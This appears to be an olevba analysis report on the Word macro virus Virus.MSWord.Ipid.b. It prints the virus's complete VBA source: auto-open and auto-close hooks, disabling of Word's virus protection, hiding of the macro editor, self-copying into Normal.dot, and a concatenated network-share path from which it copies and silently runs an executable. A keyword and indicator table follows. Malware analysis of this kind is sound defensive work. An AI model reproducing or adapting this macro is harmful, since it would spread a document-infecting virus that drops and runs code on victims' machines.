olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ipid.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ipid.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO h.bas 
in file: Virus.MSWord.Ipid.b - OLE stream: 'Macros/VBA/h'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub autoopen()
pri
End Sub
Function pri()
On Error Resume Next
Dim r1, w1, r2, r3, r4, r5, r6, p1, d1, d2, d3, e1, e2, e3, e4, e5, e6, e7, i, bar
r6 = "d.exe"
For i = 1 To Application.VBE.Windows.Count
Application.VBE.Windows(i).Visible = False
Next
i = 0
For Each bar In Application.VBE.CommandBars
i = i + 1
Application.VBE.CommandBars(i).Protection = 1
Application.VBE.CommandBars(i).Enabled = False
Next
r1 = "\\es"
Options.VirusProtection = False
Options.SaveNormalPrompt = False
r4 = "d\e$"
CommandBars(33).Controls("exibir").Controls("barras de ferramentas").Enabled = True
CommandBars(33).Controls("Ferramentas").Controls("opções...").Enabled = True
r3 = "cp"
CommandBars(33).Controls("Ferramentas").Controls("personalizar...").Enabled = True
CommandBars(33).Controls("Ferramentas").Controls("Macro").Controls("macros...").Enabled = True
r2 = "m-"
CommandBars(33).Controls("Ferramentas").Controls("Macro").Controls("Editor do Visual Basic").Enabled = False
CommandBars(33).Controls("Ferramentas").Controls("Macro").Enabled = True
r5 = "\ipi"
i = 0
For Each bar In CommandBars
i = i + 1
If (bar.NameLocal = "Caixa de ferram. de controle") Or (bar.NameLocal = "Visual Basic") Then
CommandBars(i).Protection = 1
CommandBars(i).Enabled = False
Else
CommandBars(i).Protection = 0
CommandBars(i).Enabled = True
End If
Next
p1 = r1 + r2 + r3 + r4 + r5 + r6
   e1 = ActiveDocument.VBProject.VBComponents.Count
   If e1 >= 1 Then
      If e1 >= 2 Then
          e3 = ActiveDocument.VBProject.VBComponents(2).Name
          e7 = NormalTemplate.VBProject.VBComponents(2).Name
          If MacroContainer = ActiveDocument.Name Then
             d1 = ActiveDocument.FullName
             d2 = NormalTemplate.FullName
             e5 = NormalTemplate.VBProject.VBComponents.Count
              If e5 >= 1 Then
                  If e5 >= 2 Then
                         If e7 < e3 Then copyi
                         If e7 > e3 Then copyma
                         If e7 = e3 Then End
                         FileCopy p1, "c:\windows\ipid.exe"
                         Shell "c:\windows\ipid.exe", 0
                         End
                 End If 'rodando no ativo sem modulo no normal
                        Application.OrganizerCopy d1, d2, e3, wdOrganizerObjectProjectItems
                        Application.NormalTemplate.Save
                        FileCopy p1, "c:\windows\ipid.exe"
                        Shell "c:\windows\ipid.exe", 0
                        End
              End If
          End If 'rodando no normal.dot
           If e7 < e3 Then copyi
           If e7 > e3 Then copyma
           If e7 = e3 Then End
           FileCopy p1, "c:\windows\ipid.exe"
           Shell "c:\windows\ipid.exe", 0
           End
       End If 'rodando no normal sem modulo no proj
          If e7 < e3 Then copyi
          If e7 > e3 Then copyi
          If e7 = e3 Then copyma
          FileCopy p1, "c:\windows\ipid.exe"
          Shell "c:\windows\ipid.exe", 0
          End
End If
End Function
Function copyi()
On Error Resume Next
Application.OrganizerDelete NormalTemplate.FullName, NormalTemplate.VBProject.VBComponents(2).Name, 3
Application.OrganizerCopy ActiveDocument.FullName, NormalTemplate.FullName, ActiveDocument.VBProject.VBComponents(2).Name, 3
Application.NormalTemplate.Save
End Function
Function copyma()
On Error Resume Next
Application.OrganizerDelete ActiveDocument.FullName, ActiveDocument.VBProject.VBComponents(2).Name, 3
Application.OrganizerCopy NormalTemplate.FullName, ActiveDocument.FullName, NormalTemplate.VBProject.VBComponents(2).Name, 3
Application.ActiveDocument.Save
End Function
Sub AutoClose()
pri
End Sub
Sub ViewVBCode()
End Sub
Sub ToolsMacro()
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |d.exe               |Executable file name                         |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |ipid.exe            |Executable file name                         |
+----------+--------------------+---------------------------------------------+

